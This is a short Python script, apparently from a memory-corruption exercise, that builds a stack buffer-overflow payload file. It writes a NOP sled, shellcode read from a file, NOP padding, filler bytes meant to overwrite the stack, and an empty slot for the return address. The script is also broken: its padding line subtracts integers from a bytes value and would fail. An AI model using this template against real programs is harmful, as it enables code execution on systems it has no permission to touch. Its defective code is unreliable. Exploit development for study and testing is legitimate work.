
shellcode = ""

with open('shellcode.txt','rb') as f:
    shellcode = f.read()

with open('payload2','wb') as f:
    f.write(b'\x90'*8)
    f.write(shellcode)
    f.write(b'\x90'*80-8-len(shellcode))
    f.write(b'AAAABBBBCCCCDDDDEEEEFFFF')
    f.write(b'') # isert address in bytes

print("Payload created!")